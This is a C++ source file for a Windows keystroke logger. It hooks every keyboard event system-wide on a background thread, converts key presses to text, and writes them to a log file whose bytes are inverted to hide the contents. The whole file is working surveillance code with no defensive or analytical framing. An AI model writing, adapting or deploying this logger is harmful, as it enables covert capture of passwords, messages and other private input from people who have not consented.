#include "KeystrokeLogger.h"
#include <fstream>
#include <iostream>
#include <vector>

// Initialize static instance pointer
KeystrokeLogger* KeystrokeLogger::instance = nullptr;

KeystrokeLogger::KeystrokeLogger(const std::string& filename)
    : logFilePath(filename), hHook(NULL) {
    instance = this;
}

KeystrokeLogger::~KeystrokeLogger() {
    Stop();
    if (workerThread.joinable()) {
        workerThread.join();
    }
}

void KeystrokeLogger::StartAsync() {
    workerThread = std::thread(&KeystrokeLogger::RunLoop, this);
}

void KeystrokeLogger::RunLoop() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

    if (!hHook) {
        std::cerr << "Error: Could not install background keyboard hook." << std::endl;
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

void KeystrokeLogger::Stop() {
    if (hHook) {
        PostThreadMessage(GetThreadId(workerThread.native_handle()), WM_QUIT, 0, 0);
    }
}

void KeystrokeLogger::Reset() {
    std::ofstream file(logFilePath, std::ios::binary | std::ios::trunc);
    if (file.is_open()) {
        file.close();
    }
}

LRESULT CALLBACK KeystrokeLogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (instance) {
            instance->ProcessKeystroke(pKey->vkCode, pKey->scanCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeystrokeLogger::ProcessKeystroke(DWORD vkCode, DWORD scanCode) {
    std::string keyString;

    // 1. Identify Special Keys
    switch (vkCode) {
    case VK_RETURN:  keyString = "[ENTER]"; break;
    case VK_BACK:    keyString = "[BACKSPACE]"; break;
    case VK_TAB:     keyString = "[TAB]"; break;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:  keyString = "[SHIFT]"; break;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:keyString = "[CTRL]"; break;
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:   keyString = "[ALT]"; break;
    case VK_CAPITAL: keyString = "[CAPSLOCK]"; break;
    case VK_ESCAPE:  keyString = "[ESC]"; break;
    case VK_SPACE:   keyString = " "; break;
    case VK_LEFT:    keyString = "[LEFT]"; break;
    case VK_RIGHT:   keyString = "[RIGHT]"; break;
    case VK_UP:      keyString = "[UP]"; break;
    case VK_DOWN:    keyString = "[DOWN]"; break;
    default:
        // 2. Translate Character Keys (Preserving Case/Symbols)
        BYTE keyboardState[256];
        if (GetKeyboardState(keyboardState)) {
            wchar_t buffer[5];
            // ToUnicode handles the Shift/Caps state to provide 'a' vs 'A'
            int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

            if (result > 0) {
                std::wstring ws(buffer, result);
                keyString = std::string(ws.begin(), ws.end());
            }
        }
        break;
    }

    if (!keyString.empty()) {
        AppendInverted(keyString);
    }
}

void KeystrokeLogger::AppendInverted(const std::string& text) {
    // Open in binary and append mode
    std::ofstream file(logFilePath, std::ios::binary | std::ios::app);

    if (file.is_open()) {
        for (char c : text) {
            // Apply bitwise NOT to every individual character byte
            unsigned char invertedByte = ~static_cast<unsigned char>(c);
            file.put(invertedByte);
        }
        file.close();
    }
}